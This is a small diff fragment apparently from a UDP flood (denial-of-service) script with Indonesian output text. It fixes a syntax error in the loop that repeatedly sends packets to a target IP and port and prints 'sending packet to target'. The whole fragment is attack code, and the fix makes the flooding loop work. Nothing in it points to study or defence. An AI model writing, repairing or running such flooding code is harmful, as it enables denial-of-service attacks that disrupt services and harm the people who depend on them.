@@ -66,7 +66,7 @@ def run():
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
-			for x in range(times)s):
+			for x in range(times):
 				s.sendto(data,addr)
 			print(i +" MENGIRIM PACKET KE TARGET!!!")
 		except:
